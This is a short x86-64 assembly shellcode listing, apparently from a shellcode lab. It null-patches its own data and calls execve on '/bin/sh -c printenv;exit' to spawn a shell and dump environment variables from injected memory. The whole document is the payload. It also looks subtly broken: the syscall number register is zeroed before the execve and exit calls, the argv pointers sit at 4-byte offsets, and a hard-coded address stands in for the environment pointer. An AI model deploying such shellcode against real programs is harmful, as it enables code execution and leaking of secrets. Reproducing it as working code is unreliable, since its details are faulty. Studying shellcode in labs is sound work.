          bits 64
            ; find out where we are
start:     jmp short codeEnd
start2:    pop rsi

            ; clear the a register
           xor rax, rax

            ; restore null bytes to data
           mov [rsi + flagStr-exeStr - 2],al
           mov [rsi + cmdStr-exeStr - 1],al
           mov [rsi + arrayAddr-exeStr - 1],al
           mov [rsi + arrayAddr-exeStr + 24],rax

           mov [rsi + arrayAddr - exeStr], rsi
           lea rdi, [rsi + flagStr - exeStr]
           mov [rsi + arrayAddr - exeStr + 4], rdi
           lea rdi, [rsi + cmdStr - exeStr]
           mov [rsi + arrayAddr - exeStr + 8], rdi
      
           mov rdx, rsp
           shr rdx, 32
           shl rdx, 32
           mov rcx, 0xf7ffe138
           or rdx, rcx
           
            ; execve system call
           xor rax, rax
           mov rdi, rsi
           lea rsi, [rsi + arrayAddr - exeStr]
           mov rdx,[rdx]
           syscall

            ; exit system call
           mov rdi,rax
           xor rax, rax
           syscall

codeEnd:   call start2
            ; data
exeStr:    db "/bin/shXy"
flagStr:   db "-cX"
cmdStr:    db "printenv;exitX"
arrayAddr: dq 0xffffffffffffffff
           dq 0xffffffffffffffff
           dq 0xffffffffffffffff
           dq 0xffffffffffffffff
newAddr:  dd newAddr-start
